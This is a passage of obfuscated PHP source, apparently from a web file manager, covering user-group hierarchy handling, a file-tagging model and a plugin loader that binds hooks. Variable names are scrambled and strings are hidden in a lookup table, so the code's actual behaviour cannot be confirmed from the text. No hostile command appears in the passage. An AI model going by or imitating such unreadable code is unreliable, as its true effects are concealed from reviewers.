$ş§¾¶ä[33], $ş§¾¶ä[1749]); $™¢²”™Â‹ = $this->where(array($ş§¾¶ä[1836] => array($ş§¾¶ä[7], $º¦Ê¾üœæÃà)))->select(); if (!$™¢²”™Â‹) { return array(); } return $™¢²”™Â‹; } protected function _listDataApplyItem($Ïû¤) { $›Êí¶ü»½‚ = array($Ïû¤); $this->_listDataApply($›Êí¶ü»½‚); return $›Êí¶ü»½‚[0]; } protected function _listDataApply(&$å–Š’«÷Ø) { $­û¶Úï·´ò„ =& $_SERVER[èÍ×öˆøÉ]; if (!$å–Š’«÷Ø) { return; } $°¼ãËÃú§ = array_to_keyvalue($å–Š’«÷Ø, $­û¶Úï·´ò„[33], $­û¶Úï·´ò„[1749]); $this->_listAppendChildren($å–Š’«÷Ø); $this->_listAppendChildrenMember($å–Š’«÷Ø); $this->_listAppendMeta($å–Š’«÷Ø, $°¼ãËÃú§); $this->_listAppendParent($å–Š’«÷Ø); $this->_listAppendSourceRoot($å–Š’«÷Ø, $°¼ãËÃú§); } private function _listAppendChildren(&$Ôß¦) { $ÕÙ¬Á¼‡ÖŞì¢ =& $_SERVER[èÍ×öˆøÉ]; $áíŒ İ¥ = array_to_keyvalue($Ôß¦, $ÕÙ¬Á¼‡ÖŞì¢[33], $ÕÙ¬Á¼‡ÖŞì¢[1749]); $·² = array($ÕÙ¬Á¼‡ÖŞì¢[492] => array($ÕÙ¬Á¼‡ÖŞì¢[7], $áíŒ İ¥)); $öˆ…Ê®«ğ = array($ÕÙ¬Á¼‡ÖŞì¢[492], $ÕÙ¬Á¼‡ÖŞì¢[1846] => $ÕÙ¬Á¼‡ÖŞì¢[494]); $‘ıæÅó«Ù‘Œ = $this->field($öˆ…Ê®«ğ)->where($·²)->group($ÕÙ¬Á¼‡ÖŞì¢[492])->select(); $¢ğ™ç = array_to_keyvalue($‘ıæÅó«Ù‘Œ, $ÕÙ¬Á¼‡ÖŞì¢[492], $ÕÙ¬Á¼‡ÖŞì¢[494]); foreach ($Ôß¦ as &$ÕëÍ) { $×¼ = $ÕëÍ[$ÕÙ¬Á¼‡ÖŞì¢[1749]]; $ÕëÍ[$ÕÙ¬Á¼‡ÖŞì¢[1847]] = isset($¢ğ™ç[$×¼]) ? intval($¢ğ™ç[$×¼]) : !1; } unset($ÕëÍ); } private function _listAppendChildrenMember(&$ñÕ×) { $ÑÁãÖ™™ƒÄ =& $_SERVER[èÍ×öˆøÉ]; $ë”ÅÎ´£Ûğ = array_to_keyvalue($ñÕ×, $ÑÁãÖ™™ƒÄ[33], $ÑÁãÖ™™ƒÄ[1749]); $˜‘€ñô– = array($ÑÁãÖ™™ƒÄ[1749] => array($ÑÁãÖ™™ƒÄ[7], $ë”ÅÎ´£Ûğ)); $€ªƒİ = array($ÑÁãÖ™™ƒÄ[1749], $ÑÁãÖ™™ƒÄ[1846] => $ÑÁãÖ™™ƒÄ[494]); $ÅŸİ•ÙÒã = Model($ÑÁãÖ™™ƒÄ[1838])->field($€ªƒİ)->where($˜‘€ñô–)->group($ÑÁãÖ™™ƒÄ[1749])->select(); $«øÄŠÖÎ = array_to_keyvalue($ÅŸİ•ÙÒã, $ÑÁãÖ™™ƒÄ[1749], $ÑÁãÖ™™ƒÄ[494]); foreach ($ñÕ× as &$Üó±) { $çËÇÊ–›éŒ = $Üó±[$ÑÁãÖ™™ƒÄ[1749]]; $Üó±[$ÑÁãÖ™™ƒÄ[1848]] = isset($«øÄŠÖÎ[$çËÇÊ–›éŒ]) ? intval($«øÄŠÖÎ[$çËÇÊ–›éŒ]) : !1; } unset($Üó±); } private function _listAppendMeta(&$‚—¡€·‹ûˆ±, $”Ó) { $åÙà‡ =& $_SERVER[èÍ×öˆøÉ]; $‡¹ëË” = array($åÙà‡[1749] => array($åÙà‡[7], $”Ó)); $·¯õÓ’Ç¯ = Model($åÙà‡[1837])->where($‡¹ëË”)->select(); $·¯õÓ’Ç¯ = array_to_keyvalue_group($·¯õÓ’Ç¯, $åÙà‡[1749]); foreach ($·¯õÓ’Ç¯ as &$¼¢ÕßæÌäÃ§Û) { $¼¢ÕßæÌäÃ§Û = array_to_keyvalue($¼¢ÕßæÌäÃ§Û, $åÙà‡[93], $åÙà‡[372]); } unset($¼¢ÕßæÌäÃ§Û); foreach ($‚—¡€·‹ûˆ± as &$£ÙÌ¢¾¿) { $£ÙÌ¢¾¿[$åÙà‡[459]] = array(); if (isset($·¯õÓ’Ç¯[$£ÙÌ¢¾¿[$åÙà‡[1749]]])) { $£ÙÌ¢¾¿[$åÙà‡[459]] = $·¯õÓ’Ç¯[$£ÙÌ¢¾¿[$åÙà‡[1749]]]; } } unset($£ÙÌ¢¾¿); } protected function parentLevelArray($Ø÷³®ÌÃ¼) { $Á =& $_SERVER[èÍ×öˆøÉ]; $Ø÷³®ÌÃ¼ = explode($Á[47], trim($Ø÷³®ÌÃ¼, $Á[47])); $Ø÷³®ÌÃ¼ = array_remove_value($Ø÷³®ÌÃ¼, $Á[191]); return $Ø÷³®ÌÃ¼; } private function _listAppendParent(&$şÏÌ) { $ş¨¸ŠÎ =& $_SERVER[èÍ×öˆøÉ]; $…¤æ¨Á = array(); foreach ($şÏÌ as &$³çğ»¨) { $…¤æ¨Á[$³çğ»¨[$ş¨¸ŠÎ[1749]]] = $³çğ»¨[$ş¨¸ŠÎ[28]]; $§¬îÏ = $this->parentLevelArray($³çğ»¨[$ş¨¸ŠÎ[515]]); foreach ($§¬îÏ as $µÕ²) { if (!isset($…¤æ¨Á[$µÕ²])) { $…¤æ¨Á[$µÕ²] = 0; } } } unset($³çğ»¨); foreach ($…¤æ¨Á as $´˜¢Åà…šŸ => $İá‡ıö‡Ñ) { if ($İá‡ıö‡Ñ) { continue; } $Åºí‹Ğã = $this->getInfoSimple($´˜¢Åà…šŸ); $…¤æ¨Á[$´˜¢Åà…šŸ] = $Åºí‹Ğã[$ş¨¸ŠÎ[28]]; } $öŸ¬£ÍÕóÎÚÍ = $GLOBALS[$ş¨¸ŠÎ[6]][$ş¨¸ŠÎ[88]][$ş¨¸ŠÎ[1849]]; if ($GLOBALS[$ş¨¸ŠÎ[499]] == $ş¨¸ŠÎ[87]) { $öŸ¬£ÍÕóÎÚÍ = !1; } foreach ($şÏÌ as &$³çğ»¨) { $§¬îÏ = $this->parentLevelArray($³çğ»¨[$ş¨¸ŠÎ[515]]); $Œ§ã× = $ş¨¸ŠÎ[33]; foreach ($§¬îÏ as $´˜¢Åà…šŸ => $µÕ²) { if ($öŸ¬£ÍÕóÎÚÍ && $´˜¢Åà…šŸ == 0) { continue; } $Œ§ã× .= $…¤æ¨Á[$µÕ²] . $ş¨¸ŠÎ[8]; } if ($§¬îÏ) { $Œ§ã× .= $³çğ»¨[$ş¨¸ŠÎ[28]]; } $³çğ»¨[$ş¨¸ŠÎ[520]] = str_replace($ş¨¸ŠÎ[523], $ş¨¸ŠÎ[8], $Œ§ã×); } unset($³çğ»¨); } private function _listAppendSourceRoot(&$Ğ°, $È»‹ë) { $ì·è =& $_SERVER[èÍ×öˆøÉ]; $¢Ç§ºøı¹ìôà = array($ì·è[492] => 0, $ì·è[498] => array($ì·è[7], $È»‹ë), $ì·è[406] => SourceModel::TYPE_GROUP); $»ÀÃ°ú¤ä = Model($ì·è[827])->order($ì·è[1850])->field($ì·è[1851]); $´şİÏÉ‘´˜ = $»ÀÃ°ú¤ä->limit(count($È»‹ë))->where($¢Ç§ºøı¹ìôà)->select(); $´şİÏÉ‘´˜ = array_to_keyvalue($´şİÏÉ‘´˜, $ì·è[498]); $´şİÏÉ‘´˜ = array_remove_key($´şİÏÉ‘´˜, $ì·è[498]); foreach ($Ğ° as &$¥ÏÃ) { $¥ÏÃ[$ì·è[85]] = $´şİÏÉ‘´˜[$¥ÏÃ[$ì·è[1749]]] ? $´şİÏÉ‘´˜[$¥ÏÃ[$ì·è[1749]]] : array(); } unset($¥ÏÃ); } protected function groupMerge($˜Õ) { $˜Õ = array_values(array_unique($˜Õ)); $“ğß‹Òëí² = array(); for ($óøä = 0; $óøä < count($˜Õ); $óøä++) { $¶¡Ù = !1; for ($ğŸ‹òíÀ = 0; $ğŸ‹òíÀ < count($˜Õ); $ğŸ‹òíÀ++) { if ($óøä == $ğŸ‹òíÀ) { continue; } if ($this->isParentOf($˜Õ[$ğŸ‹òíÀ], $˜Õ[$óøä])) { $¶¡Ù = !0; break; } } if (!$¶¡Ù) { $“ğß‹Òëí²[] = $˜Õ[$óøä]; } } return $“ğß‹Òëí²; } protected function isParentOf($Ç°ÙúåŸ®ÆÌï, $¯õë) { $·¿ =& $_SERVER[èÍ×öˆøÉ]; if (!$Ç°ÙúåŸ®ÆÌï || !$¯õë || $Ç°ÙúåŸ®ÆÌï == $¯õë) { return !1; } $¾ö§—ñ ¯Î = $this->getInfoSimple($Ç°ÙúåŸ®ÆÌï); $¶ùïèœóŒ¬ = $this->getInfoSimple($¯õë); $×ÄéüÒç–¶¸ = $¾ö§—ñ ¯Î[$·¿[515]] . $Ç°ÙúåŸ®ÆÌï . $·¿[47]; if (substr($¶ùïèœóŒ¬[$·¿[515]], 0, strlen($×ÄéüÒç–¶¸)) == $×ÄéüÒç–¶¸) { return !0; } return !1; } public function groupShowRoot($²Ö‹ÍÅ•, $ì‹®ÊÎéĞäì× = false) { $Êã ‰ =& $_SERVER[èÍ×öˆøÉ]; $‰ŠÉ = $this->getInfo($²Ö‹ÍÅ•); if (!$‰ŠÉ) { return array(); } $ªÃô÷É = $this->parentLevelArray($‰ŠÉ[$Êã ‰[515]]); $ÏãË§ëôÜ¡â = array($²Ö‹ÍÅ•); if (count($ªÃô÷É) == 0) { return $ÏãË§ëôÜ¡â; } if ($ì‹®ÊÎéĞäì× && count($ªÃô÷É) == 1) { return $ÏãË§ëôÜ¡â; } if (!$‰ŠÉ[$Êã ‰[459]] || !isset($‰ŠÉ[$Êã ‰[459]][$Êã ‰[1834]]) || $‰ŠÉ[$Êã ‰[459]][$Êã ‰[1834]] == $Êã ‰[1803]) { return $this->groupShowRoot($ªÃô÷É[count($ªÃô÷É) - 1], $ì‹®ÊÎéĞäì×); } if ($‰ŠÉ[$Êã ‰[459]][$Êã ‰[1834]] == $Êã ‰[355]) { $ğòİÀ = explode($Êã ‰[47], $‰ŠÉ[$Êã ‰[459]][$Êã ‰[1835]]); if ($ğòİÀ) { $ÏãË§ëôÜ¡â = array_merge($ÏãË§ëôÜ¡â, $ğòİÀ); } } return $ÏãË§ëôÜ¡â; } protected function resetParentLevel() { $ÓÚíù =& $_SERVER[èÍ×öˆøÉ]; $õÒì¿¡˜ = $ÓÚíù[1749]; $î¸‡ĞÃ¤¸Ã = $this->select(); $î¸‡ĞÃ¤¸Ã = array_to_keyvalue($î¸‡ĞÃ¤¸Ã, $õÒì¿¡˜); foreach ($î¸‡ĞÃ¤¸Ã as $¦ùïå) { $Â·Ûš©–ò·İÑ = $¦ùïå; $¶‹«ãü = array(); while ($Â·Ûš©–ò·İÑ[$ÓÚíù[492]] != 0) { $¶‹«ãü[] = $Â·Ûš©–ò·İÑ[$ÓÚíù[492]]; $Â·Ûš©–ò·İÑ = $î¸‡ĞÃ¤¸Ã[$Â·Ûš©–ò·İÑ[$ÓÚíù[492]]]; } $¶‹«ãü[] = 0; $¶‹«ãü = $ÓÚíù[47] . implode($ÓÚíù[47], array_reverse($¶‹«ãü)) . $ÓÚíù[47]; $this->setNamePinyin($¦ùïå[$õÒì¿¡˜], $¦ùïå[$ÓÚíù[28]]); $this->where(array($õÒì¿¡˜ => $¦ùïå[$õÒì¿¡˜]))->save(array($ÓÚíù[578] => $¶‹«ãü)); } return $î¸‡ĞÃ¤¸Ã; } public function groupNameAuto($Åñ³†²ş‡ç, $ïÃ) { $åêËŒî„àß· =& $_SERVER[èÍ×öˆøÉ]; $ô = $this->where(array($åêËŒî„àß·[396] => $Åñ³†²ş‡ç))->getField($åêËŒî„àß·[28], !0); if (!$ô || !in_array($ïÃ, $ô)) { return $ïÃ; } for ($¿øŒêšì–”— = 1; $¿øŒêšì–”— <= count($ô) + 1; $¿øŒêšì–”—++) { $¬Üò´¹õ = $ïÃ . "\x28{$¿øŒêšì–”—}\51"; if (!in_array($¬Üò´¹õ, $ô)) { return $¬Üò´¹õ; } } } public function groupSwitch($İî‘¶®³‹äø, $ë¦Àõ) { $•œğİÅ¿ü”¨ =& $_SERVER[èÍ×öˆøÉ]; $“Ó = array($•œğİÅ¿ü”¨[1749] => array($•œğİÅ¿ü”¨[7], array($İî‘¶®³‹äø, $ë¦Àõ))); $¤‚ = $this->where($“Ó)->select(); $¤‚ = array_to_keyvalue($¤‚, $•œğİÅ¿ü”¨[1749]); if (!isset($¤‚[$İî‘¶®³‹äø]) || !isset($¤‚[$ë¦Àõ]) || $¤‚[$İî‘¶®³‹äø][$•œğİÅ¿ü”¨[492]] == 0) { return !1; } $“Ó = array($•œğİÅ¿ü”¨[1749] => $İî‘¶®³‹äø); $È¢ÊÖ“ = Model($•œğİÅ¿ü”¨[1838])->where($“Ó)->select(); if (!$È¢ÊÖ“) { $È¢ÊÖ“ = array(); } foreach ($È¢ÊÖ“ as $×³¨ô¬ÓÇ) { $ò = $×³¨ô¬ÓÇ[$•œğİÅ¿ü”¨[1582]]; $“Ó = array($•œğİÅ¿ü”¨[1582] => $ò, $•œğİÅ¿ü”¨[1749] => $ë¦Àõ); $¯¾êÒ¹ÑÂÆã = Model($•œğİÅ¿ü”¨[1838])->where($“Ó)->find(); if (!$¯¾êÒ¹ÑÂÆã) { $‹ÖµÃ½À§ = array($ë¦Àõ => $×³¨ô¬ÓÇ[$•œğİÅ¿ü”¨[1852]]); Model($•œğİÅ¿ü”¨[532])->userGroupAdd($ò, $‹ÖµÃ½À§); } Model($•œğİÅ¿ü”¨[532])->userGroupRemove($ò, $İî‘¶®³‹äø); } $“Ó = array($•œğİÅ¿ü”¨[406] => 2, $•œğİÅ¿ü”¨[492] => 0, $•œğİÅ¿ü”¨[405] => 1, $•œğİÅ¿ü”¨[498] => array($•œğİÅ¿ü”¨[7], array($İî‘¶®³‹äø, $ë¦Àõ))); $õÙ‘Âœ = Model($•œğİÅ¿ü”¨[827])->where($“Ó)->field($•œğİÅ¿ü”¨[1853])->select(); $õÙ‘Âœ = array_to_keyvalue($õÙ‘Âœ, $•œğİÅ¿ü”¨[498], $•œğİÅ¿ü”¨[397]); $°¦´Ş = !empty($õÙ‘Âœ[$İî‘¶®³‹äø]) ? $õÙ‘Âœ[$İî‘¶®³‹äø] : !1; if ($°¦´Ş) { if (!$õÙ‘Âœ[$ë¦Àõ]) { $õÙ‘Âœ[$ë¦Àõ] = Model($•œğİÅ¿ü”¨[827])->groupRootAdd($ë¦Àõ); } $¡ñîùõÑ´’ = $õÙ‘Âœ[$ë¦Àõ]; $“Ó = array($•œğİÅ¿ü”¨[492] => $°¦´Ş); $õÙ‘Âœ = Model($•œğİÅ¿ü”¨[827])->where($“Ó)->field($•œğİÅ¿ü”¨[1854])->select(); if (!$õÙ‘Âœ) { $õÙ‘Âœ = array(); } Model($•œğİÅ¿ü”¨[827])->moveClearAuth = !1; foreach ($õÙ‘Âœ as $‘“‚Š‚ôî) { $±¯’× = $‘“‚Š‚ôî[$•œğİÅ¿ü”¨[405]] == $•œğİÅ¿ü”¨[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($•œğİÅ¿ü”¨[827])->move($‘“‚Š‚ôî[$•œğİÅ¿ü”¨[397]], $¡ñîùõÑ´’, $±¯’×); } Model($•œğİÅ¿ü”¨[827])->moveClearAuth = !0; $“Ó = array($•œğİÅ¿ü”¨[406] => 2, $•œğİÅ¿ü”¨[498] => $İî‘¶®³‹äø); $ëÕëğ­”ê‘ = array($•œğİÅ¿ü”¨[498] => $ë¦Àõ); Model($•œğİÅ¿ü”¨[1855])->where($“Ó)->save($ëÕëğ­”ê‘); Model($•œğİÅ¿ü”¨[1856])->where($“Ó)->save($ëÕëğ­”ê‘); } $this->_changeChildLevel($¤‚[$İî‘¶®³‹äø], $¤‚[$ë¦Àõ], !0); $this->where(array($•œğİÅ¿ü”¨[492] => $İî‘¶®³‹äø))->save(array($•œğİÅ¿ü”¨[492] => $ë¦Àõ)); $this->_clearChildrenCache($¤‚[$ë¦Àõ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($Ÿãõéï) { $³û¢ ·ì =& $_SERVER[èÍ×öˆøÉ]; return array($³û¢ ·ì[1857] => array($Ÿãõéï[0], $³û¢ ·ì[1858]), $³û¢ ·ì[1859] => array($Ÿãõéï[0], $³û¢ ·ì[1860])); } protected function get($ã•è…óØÁ³“) { $×÷¬ÍØ’’ˆ =& $_SERVER[èÍ×öˆøÉ]; $ÕÓŸ‹ = Model($×÷¬ÍØ’’ˆ[516])->metaGet($ã•è…óØÁ³“, $×÷¬ÍØ’’ˆ[1861]); $«™Ê†“­©Ùô = json_decode($ÕÓŸ‹, !0); return $«™Ê†“­©Ùô ? $«™Ê†“­©Ùô : array($×÷¬ÍØ’’ˆ[1862] => $×÷¬ÍØ’’ˆ[87], $×÷¬ÍØ’’ˆ[367] => array()); } protected function set($ı‡Å, $Åèñˆî„–) { $»şÜ² =& $_SERVER[èÍ×öˆøÉ]; $Åèñˆî„– = $Åèñˆî„– ? $Åèñˆî„– : array($»şÜ²[1862] => $»şÜ²[87], $»şÜ²[367] => array()); Model($»şÜ²[516])->metaSet($ı‡Å, $»şÜ²[1861], json_encode($Åèñˆî„–)); return Model($»şÜ²[516])->metaSet($ı‡Å, $»şÜ²[1861], json_encode($Åèñˆî„–)); } protected function getByTagID($°¤İ¨Û, $ùÖ¯Ï) { $‹ƒ› =& $_SERVER[èÍ×öˆøÉ]; if (!$°¤İ¨Û || !$ùÖ¯Ï) { return !1; } if (!Model($‹ƒ›[516])->getInfoSimple($°¤İ¨Û)) { return !1; } $¢ÃÀáö = $this->get($°¤İ¨Û); if (!$¢ÃÀáö || !isset($¢ÃÀáö[$‹ƒ›[367]])) { return !1; } $Ÿ•œœÕ = array_find_by_field($¢ÃÀáö[$‹ƒ›[367]], $‹ƒ›[395], $ùÖ¯Ï); return is_array($Ÿ•œœÕ) ? $Ÿ•œœÕ : !1; } public function listSource($¦¶Îæ, $ä„çåƒ×’îƒª) { $«Úƒ¼»÷ =& $_SERVER[èÍ×öˆøÉ]; if ($ä„çåƒ×’îƒª && !is_array($ä„çåƒ×’îƒª)) { $ä„çåƒ×’îƒª = array($ä„çåƒ×’îƒª); } $õì = $this->listData($¦¶Îæ); $ğ£† = array(); foreach ($õì as $©¸Ô‘) { $®Ì = $©¸Ô‘[$«Úƒ¼»÷[76]]; if (!$®Ì) { continue; } if (!isset($ğ£†[$®Ì])) { $ğ£†[$®Ì] = array(); } $ğ£†[$®Ì][] = $©¸Ô‘[$«Úƒ¼»÷[421]]; } $‡˜‹’ = array(); foreach ($ğ£† as $ŸıÉ·­©Ê => $êŠ°ê§Ş) { $‰ã£¨ = !0; if (!$ä„çåƒ×’îƒª) { $‡˜‹’[] = $ŸıÉ·­©Ê; continue; } foreach ($ä„çåƒ×’îƒª as $ Ùûš¨ã) { if (!in_array($ Ùûš¨ã, $êŠ°ê§Ş)) { $‰ã£¨ = !1; break; } } if ($‰ã£¨) { $‡˜‹’[] = $ŸıÉ·­©Ê; } } if (!$‡˜‹’) { return array(); } $ô¡Ïü¥©ŞÚš = array($«Úƒ¼»÷[412] => array($«Úƒ¼»÷[413], $‡˜‹’), $«Úƒ¼»÷[498] => $¦¶Îæ, $«Úƒ¼»÷[406] => SourceModel::TYPE_GROUP); $¦ = Model($«Úƒ¼»÷[1256])->listSource($ô¡Ïü¥©ŞÚš); if (!$¦ || count($‡˜‹’) == $¦[$«Úƒ¼»÷[364]][$«Úƒ¼»÷[365]]) { return $¦; } $ñ“ãú = array(); $–ŸéÛ  = array_to_keyvalue($¦[$«Úƒ¼»÷[75]], $«Úƒ¼»÷[33], $«Úƒ¼»÷[397]); $ë•‰Ü–ƒºéòã = array_to_keyvalue($¦[$«Úƒ¼»÷[74]], $«Úƒ¼»÷[33], $«Úƒ¼»÷[397]); $Èé«ßóıëÆ = array_merge($ë•‰Ü–ƒºéòã, $–ŸéÛ ); foreach ($‡˜‹’ as $®Ì) { if (!in_array($®Ì, $Èé«ßóıëÆ)) { $ñ“ãú[] = $®Ì; } } if ($ñ“ãú) { $this->removeBySource($¦¶Îæ, $ñ“ãú); } return $¦; } protected function listData($Ï˜¬º) { $€íÍ =& $_SERVER[èÍ×öˆøÉ]; $÷ñ†¹„Ôëè† = array($€íÍ[1573] => 0, $€íÍ[477] => array($€íÍ[1863], 0), $€íÍ[417] => $€íÍ[1864] . $Ï˜¬º); $ã’äĞÕÜ = $€íÍ[1865]; $¼Ğ¿»§ = $this->field($ã’äĞÕÜ)->where($÷ñ†¹„Ôëè†)->order($€íÍ[1866])->select(); return $¼Ğ¿»§ ? $¼Ğ¿»§ : array(); } protected function addToTag($±çúúå¿“‘, $ÂºÜ, $·Ş) { $è‡¥í =& $_SERVER[èÍ×öˆøÉ]; if (!$this->getByTagID($±çúúå¿“‘, $·Ş) || !$ÂºÜ) { return !1; } if (!Model($è‡¥í[827])->pathInfo($ÂºÜ)) { return !1; } $¸™£äú•© = array($è‡¥í[1573] => 0, $è‡¥í[477] => $·Ş, $è‡¥í[416] => $ÂºÜ, $è‡¥í[417] => $è‡¥í[1867] . $±çúúå¿“‘, $è‡¥í[415] => $è‡¥í[33], $è‡¥í[1753] => 0); if ($this->where($¸™£äú•©)->find()) { return !1; } return $this->add($¸™£äú•©); } protected function removeFromTag($¸ÒÜûëÅ÷¥òŠ, $ùÎ, $à¨’¶) { $şÑ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->getByTagID($¸ÒÜûëÅ÷¥òŠ, $à¨’¶) || !$ùÎ) { return !1; } if (is_array($ùÎ)) { $ùÎ = array($şÑ[7], $ùÎ); } $ˆ¬ÏÍ = array($şÑ[1573] => 0, $şÑ[477] => $à¨’¶, $şÑ[417] => $şÑ[1867] . $¸ÒÜûëÅ÷¥òŠ, $şÑ[416] => $ùÎ); return $this->where($ˆ¬ÏÍ)->delete(); } protected function removeByTag($ìÛ¼ÖÃì, $ß¢ë—÷ÌÒîŞ) { $’öû =& $_SERVER[èÍ×öˆøÉ]; if (!$this->getByTagID($ìÛ¼ÖÃì, $ß¢ë—÷ÌÒîŞ)) { return !1; } $ë = array($’öû[1573] => 0, $’öû[477] => $ß¢ë—÷ÌÒîŞ, $’öû[417] => $’öû[1867] . $ìÛ¼ÖÃì); return $this->where($ë)->delete(); } protected function removeBySource($ñïµ, $ÒşçÃìÜ) { $¹¨¦şÁ =& $_SERVER[èÍ×öˆøÉ]; if (!$ñïµ || !$ÒşçÃìÜ) { return !1; } if (is_array($ÒşçÃìÜ)) { $ÒşçÃìÜ = array($¹¨¦şÁ[7], $ÒşçÃìÜ); } $»âÒàë£º­ = array($¹¨¦şÁ[1573] => 0, $¹¨¦şÁ[416] => $ÒşçÃìÜ, $¹¨¦şÁ[477] => array($¹¨¦şÁ[1011], 0), $¹¨¦şÁ[417] => $¹¨¦şÁ[1867] . $ñïµ); return $this->where($»âÒàë£º­)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x70\x6c\x75\x67\151\x6e\114\x69\163\x74"; public $field = array("\156\141\x6d\145", "\163\164\x61\164\165\163", "\162\x65\x67\151\x65\x73\x74", "\143\x6f\x6e\x66\151\x67"); public function loadList($Á‘½ÂÖö = false) { $—ÎÇûß = array_to_keyvalue($this->listData(), $_SERVER[èÍ×öˆøÉ][28]); if ($Á‘½ÂÖö) { return $—ÎÇûß[$Á‘½ÂÖö]; } return $—ÎÇûß; } public function init() { $§ëÏ =& $_SERVER[èÍ×öˆøÉ]; Hook::trigger($§ëÏ[1868]); $ã€üªÊ´ = $this->loadPluginList(); foreach ($ã€üªÊ´ as $ÜöâŒ => $Ş‹–Úƒ) { $ˆßö¬“¢·Ëš = $this->appAllow($ÜöâŒ, $Ş‹–Úƒ); if (!$ˆßö¬“¢·Ëš) { continue; } foreach ($Ş‹–Úƒ[$§ëÏ[1869]] as $âòƒ©“¬ó => $¼¯‡) { Hook::bind($âòƒ©“¬ó, $¼¯‡); } } Hook::trigger($§ëÏ[1870]); Hook::trigger(ACTION); } public function appAllow($şµèĞœ®’ˆ¦, $Ó‚, $®€œ = true) { $‡¹‰ =& $_SERVER[èÍ×öˆøÉ]; $ˆÈ˜¸‹Ş×¿Ú = PLUGIN_DIR . $şµèĞœ®’ˆ¦ . $‡¹‰[1871]; if (!is_array($Ó‚) || !is_array($Ó‚[$‡¹‰[1869]]) || $Ó‚[$‡¹‰[745]] != 1 || !is_file($ˆÈ˜¸‹Ş×¿Ú)) { return !1; } if ($GLOBALS[$‡¹‰[499]] == 1) { return !0; } if ($®€œ && !Action($‡¹‰[1872])->checkAuth($şµèĞœ®’ˆ¦)) { return !1; } return !0; } public function unInstall($§Óı«å˜‚á) { $ÃìÙë =& $_SERVER[èÍ×öˆøÉ]; $ë¼Úè = $this->loadList($§Óı«å˜‚á); if (file_exists(PLUGIN_DIR . $§Óı«å˜‚á)) { Hook::apply($§Óı«å˜‚á . $ÃìÙë[1873]); } $this->remove($ë¼Úè[$ÃìÙë[395]]); } public function changeStatus($¶¨‡€ÛÓÕÃÛ, $¥úó†™ÀŠ·) { $¹¤”˜‰ÚŠ =& $_SERVER[èÍ×öˆøÉ]; $‹ûı¥ší = $this->loadList($¶¨‡€ÛÓÕÃÛ); if ($¥úó†™ÀŠ·) { Hook::apply($¶¨‡€ÛÓÕÃÛ . $¹¤”˜‰ÚŠ[1874]); } $this->update($‹ûı¥ší[$¹¤”˜‰ÚŠ[395]], array($¹¤”˜‰ÚŠ[1875] => $¥úó†™ÀŠ·)); } public function appRegist($ÍÄøÍàšÒ¬Á, $ß¹›) { $ÙĞ•‡ôÌó =& $_SERVER[èÍ×öˆøÉ]; $¥ÆùÅÌíĞ¤ = $this->loadList($ÍÄøÍàšÒ¬Á); if ($¥ÆùÅÌíĞ¤) { $this->update($¥ÆùÅÌíĞ¤[$ÙĞ•‡ôÌó[395]], array($ÙĞ•‡ôÌó[1869] => $ß¹›)); } else { $€ë“„ = array($ÙĞ•‡ôÌó[28] => $ÍÄøÍàšÒ¬Á, $ÙĞ•‡ôÌó[1869] => $ß¹›, $ÙĞ•‡ôÌó[745] => 0, $ÙĞ•‡ôÌó[6] => $this->getConfigDefault($ÍÄøÍàšÒ¬Á)); $this->insert($€ë“„); } } public function getConfigDefault($ÌúòÛÅÅ) { $“²Ú¤Ì©ı =& $_SERVER[èÍ×öˆøÉ]; $ŞÀ = array(); $ª„ = $this->getPackageJson($ÌúòÛÅÅ); if (!$ª„ && is_array($ª„[$“²Ú¤Ì©ı[1876]])) { return $ŞÀ; } foreach ($ª„[$“²Ú¤Ì©ı[1876]] as $éçè => $İÇ›) { if (!isset($İÇ›[$“²Ú¤Ì©ı[372]]) || isset($ŞÀ[$éçè])) { continue; } $ŞÀ[$éçè] = $İÇ›[$“²Ú¤Ì©ı[372]]; } return $ŞÀ; } public function getPackageJson($î°†½ÉĞ†ƒ) { return Hook::apply($î°†½ÉĞ†ƒ . $_SERVER[èÍ×öˆøÉ][1877]); } public function getConfig($ïÜÅ³, $½Âşôèñ±ñ = false) { $Æ‰ñ =& $_SERVER[èÍ×öˆøÉ]; $°³æÉÜƒØ€ç = array(); $«±¸Ø = $this->loadList($ïÜÅ³); if ($«±¸Ø && is_array($«±¸Ø[$Æ‰ñ[6]])) { $°³æÉÜƒØ€ç = $«±¸Ø[$Æ‰ñ[6]]; } if (!$°³æÉÜƒØ€ç || $½Âşôèñ±ñ) { $°³æÉÜƒØ€ç = $this->getConfigDefault($ïÜÅ³); } return $°³æÉÜƒØ€ç; } public function setConfig($ïøÎ €“íÍ, $ïÏÌ = false) { $ïÏÆĞéê¤ĞÇ =& $_SERVER[èÍ×öˆøÉ]; $ÁÂĞúßèî…† = $this->loadList($ïøÎ €“íÍ); if (!$ÁÂĞúßèî…†) { return !1; } $Ò¤ïàÀûºîÜ = $ÁÂĞúßèî…†[$ïÏÆĞéê¤ĞÇ[6]]; if ($ïÏÌ == !1) { $Ò¤ïàÀûºîÜ = array(); $ïÏÌ = $this->getConfigDefault($ïøÎ €“íÍ); } foreach ($ïÏÌ as $â‚ => $èù›ı) { $Ò¤ïàÀûºîÜ[$â‚] = is_string($èù›ı) ? trim($èù›ı) : $èù›ı; } $this->update($ÁÂĞúßèî…†[$ïÏÆĞéê¤ĞÇ[395]], array($ïÏÆĞéê¤ĞÇ[6] => $Ò¤ïàÀûºîÜ)); } public function viewList() { $’ö—¬©Ò° =& $_SERVER[èÍ×öˆøÉ]; $µÅØ¥–¥Îíü = $this->loadList(); $this->pluginScan($µÅØ¥–¥Îíü); $µÅØ¥–¥Îíü = $this->loadPluginList(); $§ƒÅÍ¼µ¼Ç = array(); foreach ($µÅØ¥–¥Îíü as $…ñ¶ƒ  ş => $¼ìàªä°œÊı) { unset($¼ìàªä°œÊı[$’ö—¬©Ò°[1869]], $¼ìàªä°œÊı[$’ö—¬©Ò°[6]]); $ĞÕ = PLUGIN_DIR . $¼ìàªä°œÊı[$’ö—¬©Ò°[28]] . $’ö—¬©Ò°[1871]; if (!is_file($ĞÕ)) { continue; } $é«µÄöÌüƒ = Hook::apply($¼ìàªä°œÊı[$’ö—¬©Ò°[28]] . $’ö—¬©Ò°[1877]); if (is_array($é«µÄöÌüƒ)) { $§ƒÅÍ¼µ¼Ç[$…ñ¶ƒ  ş] = array_merge($¼ìàªä°œÊı, 